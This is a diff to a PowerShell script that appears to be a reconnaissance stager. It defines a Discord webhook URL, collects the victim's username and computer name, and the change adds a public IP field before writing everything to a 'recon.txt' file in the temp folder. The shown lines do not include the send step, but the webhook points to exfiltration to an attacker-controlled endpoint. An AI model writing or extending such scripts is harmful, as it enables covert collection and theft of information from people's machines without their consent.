@@ -2,7 +2,8 @@ $webhookUrl = "https://discordapp.com/api/webhooks/1360981550174441498/cxv3RG3ND
 
 $username = $env:USERNAME
 $computername = $env:COMPUTERNAME
-$output = "$username `n$computername"
+$ip_adress = $env:PUBLIC_IP
+$output = "Username: $username `nComputername: $computername`nIPadress: $ip_adress"
 $path = "$env:TEMP\recon.txt"
 
 $output | Out-File $path
